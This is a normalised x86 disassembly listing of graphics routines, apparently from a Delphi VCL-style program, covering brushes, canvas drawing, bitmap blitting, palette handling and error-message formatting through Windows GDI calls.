sub_427570
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_42758c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4269c0
xor eax eax
push ebp
push sub_4275d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_426340
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4275d8
mov eax [ ebp - 0x4 ]
call sub_4269d0
retn
sub_4275dc
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_42758c
add esp 0x10
pop edi
pop esi
retn
sub_427608
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_427570
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_42758c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_42763c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_426194
xor edx edx
push ebp
push sub_427709
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4261a0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_42697c
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_427724
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_427570
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_42758c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_427758
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403360
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_426c68
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_427f98
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427194
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_427fb8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_427460
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_427fd8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_41b990
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_42781c
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_41ba2c
xor edx edx
mov eax esi
call sub_427dd0
mov eax [ esi + 0xc ]
call sub_403390
mov eax [ esi + 0x10 ]
call sub_403390
mov eax [ esi + 0x14 ]
call sub_403390
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41bc24
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_427878
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_427e24
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_427900
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
mov eax [ ebx + 0x14 ]
call sub_427600
call sub_42697c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42697c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41a018
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4279ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
mov eax [ ebx + 0x14 ]
call sub_42763c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4279e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
mov eax [ ebx + 0x14 ]
call sub_42763c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_427a24
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_427a84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_427ab0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_427ae8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_427b30
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_427b6c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4043e0
push eax
mov eax edi
call sub_4045e0
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_427bb0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_427b6c
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_427bcc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_427b6c
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_427bec
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_427c38
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427c3f
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_427a5c
sub_427c98
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_427cbc
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_427a84
pop ecx
pop edx
pop edi
pop esi
retn
sub_427cdc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_427d08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_427e24
mov eax [ ebp + 0x8 ]
call sub_42697c
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_427d70
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_427dd0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_427d70
mov edx esp
mov eax ebx
call sub_427c98
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_427cbc
sub_427e24
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_427ec0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd00
call sub_403b5c
test bl 0x8
je r-xdata
mov eax esi
call sub_427eec
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_427f1c
sub_427ec0
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_426e50
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_42697c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_427eec
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_427350
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_427f1c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_42763c
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_42763c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_42771c
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_427600
call sub_42697c
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_427600
call sub_42697c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_42804c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_428096
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42809d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_4280a0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_42813c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_42804c
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404390
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428143
lea eax [ ebp - 0x104 ]
call sub_404120
retn
sub_428158
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_4282a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_428215
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4280a0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4280a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4282ad
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_4282b8
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_4282ec
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_428148
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_42856c
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_428148
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428573
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_428148
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4283bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406ee0
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428573
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_428580
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_4285b8
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402da4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_428630
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_428688
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4029b0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428785
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42878c
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_4287a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
